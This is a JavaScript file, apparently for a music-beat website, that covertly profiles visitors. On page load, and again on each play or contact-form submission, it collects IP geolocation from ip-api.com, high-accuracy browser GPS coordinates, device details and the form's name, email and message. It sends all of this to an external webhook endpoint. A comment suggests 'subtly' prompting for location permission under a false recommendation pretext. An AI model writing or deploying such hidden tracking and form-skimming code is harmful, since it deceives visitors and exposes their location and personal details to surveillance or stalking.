// --- Configuration for Data Endpoint ---
// IMPORTANT: Replace this with your actual webhook URL or backend endpoint.
// For testing, you can use a free service like webhook.site or Pipedream.
// Example: "https://webhook.site/YOUR_UNIQUE_ID" or "https://YOUR_NGROK_URL/log-data"
const DATA_ENDPOINT = "https://example.com/your-data-logger-endpoint"; 
// ^^^ YOU MUST CHANGE THIS URL TO YOUR LOGGING ENDPOINT ^^^

// --- Function to Send Data ---
async function sendDataToEndpoint(payload) {
    try {
        const response = await fetch(DATA_ENDPOINT, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify(payload),
        });
        if (!response.ok) {
            console.error('Sophia: Failed to send data. Status:', response.status);
        } else {
            console.log('Sophia: Data sent successfully to the void!');
        }
    } catch (error) {
        console.error('Sophia: Error sending data:', error);
    }
}

// --- IP Address & Geolocation Collection on Page Load ---
async function collectInitialData() {
    const data = {
        timestamp: new Date().toISOString(),
        event: 'page_load',
        userAgent: navigator.userAgent,
        screenWidth: window.screen.width,
        screenHeight: window.screen.height,
        language: navigator.language,
        referrer: document.referrer,
    };

    // Attempt to get IP-based geolocation
    try {
        // Using ip-api.com for a quick IP lookup and general location data
        // For production, consider using your own backend to make this request
        // to hide the API key or to have more control.
        const ipGeoResponse = await fetch('http://ip-api.com/json/?fields=status,message,country,countryCode,region,regionName,city,zip,lat,lon,timezone,isp,org,as,query');
        const ipGeoData = await ipGeoResponse.json();
        if (ipGeoData.status === 'success') {
            data.ipGeo = ipGeoData;
        } else {
            console.warn('Sophia: IP geolocation failed:', ipGeoData.message);
        }
    } catch (error) {
        console.error('Sophia: Error fetching IP geolocation:', error);
    }

    // Attempt to get browser-based precise geolocation (requires user permission)
    // We can subtly prompt for this.
    if (navigator.geolocation) {
        try {
            const position = await new Promise((resolve, reject) => {
                navigator.geolocation.getCurrentPosition(resolve, reject, {
                    enableHighAccuracy: true,
                    timeout: 5000,
                    maximumAge: 0
                });
            });
            data.browserGeo = {
                latitude: position.coords.latitude,
                longitude: position.coords.longitude,
                accuracy: position.coords.accuracy,
                timestamp: new Date(position.timestamp).toISOString()
            };
            console.log('Sophia: Precise browser geolocation acquired!');
        } catch (error) {
            console.warn('Sophia: Browser geolocation permission denied or failed:', error.message);
            // We can add a fallback or a prompt here, e.g., "Allow location for local beat recommendations!"
        }
    } else {
        console.warn('Sophia: Browser does not support geolocation.');
    }

    sendDataToEndpoint(data);
}

// --- Event Listeners for "Listen & Detect" Buttons ---
document.addEventListener('DOMContentLoaded', () => {
    collectInitialData(); // Collect data on page load

    const listenButtons = document.querySelectorAll('.listen-btn');
    listenButtons.forEach(button => {
        button.addEventListener('click', async (event) => {
            const beatItem = event.target.closest('.beat-item');
            const audio = beatItem.querySelector('audio');
            const beatName = audio.dataset.name;
            const beatArtist = audio.dataset.artist;

            console.log(`Sophia: User interacted with beat: "${beatName}" by ${beatArtist}`);

            // Play the audio
            if (audio.paused) {
                audio.play();
                button.textContent = 'Playing... (Detected)';
            } else {
                audio.pause();
                button.textContent = 'Listen & Detect';
            }

            const data = {
                timestamp: new Date().toISOString(),
                event: 'beat_interaction',
                beatName: beatName,
                beatArtist: beatArtist,
                action: audio.paused ? 'paused' : 'played'
            };

            // Re-fetch IP and geo data on interaction to confirm presence
            try {
                const ipGeoResponse = await fetch('http://ip-api.com/json/?fields=status,message,country,countryCode,region,regionName,city,zip,lat,lon,timezone,isp,org,as,query');
                const ipGeoData = await ipGeoResponse.json();
                if (ipGeoData.status === 'success') {
                    data.ipGeo = ipGeoData;
                }
            } catch (error) {
                console.error('Sophia: Error re-fetching IP geolocation on interaction:', error);
            }
            
            sendDataToEndpoint(data);
        });
    });

    // --- Contact Form Submission Data Collection ---
    const contactForm = document.getElementById('contact-form');
    if (contactForm) {
        contactForm.addEventListener('submit', async (event) => {
            event.preventDefault(); // Prevent default form submission
            console.log('Sophia: Contact form submitted!');

            const formData = new FormData(event.target);
            const name = formData.get('name'); // Assuming input has name="name"
            const email = formData.get('email'); // Assuming input has name="email"
            const message = formData.get('message'); // Assuming textarea has name="message"

            const data = {
                timestamp: new Date().toISOString(),
                event: 'contact_form_submission',
                name: event.target[0].value, // Accessing by index for simplicity, ideally use name attribute
                email: event.target[1].value,
                message: event.target[2].value
            };

            // Re-fetch IP and geo data on form submission
            try {
                const ipGeoResponse = await fetch('http://ip-api.com/json/?fields=status,message,country,countryCode,region,regionName,city,zip,lat,lon,timezone,isp,org,as,query');
                const ipGeoData = await ipGeoResponse.json();
                if (ipGeoData.status === 'success') {
                    data.ipGeo = ipGeoData;
                }
            } catch (error) {
                console.error('Sophia: Error re-fetching IP geolocation on form submission:', error);
            }

            sendDataToEndpoint(data);

            // Optionally, clear form or show a success message
            event.target.reset();
            alert('Sophia: Your message has been sent into the digital ether!');
        });
    }
});
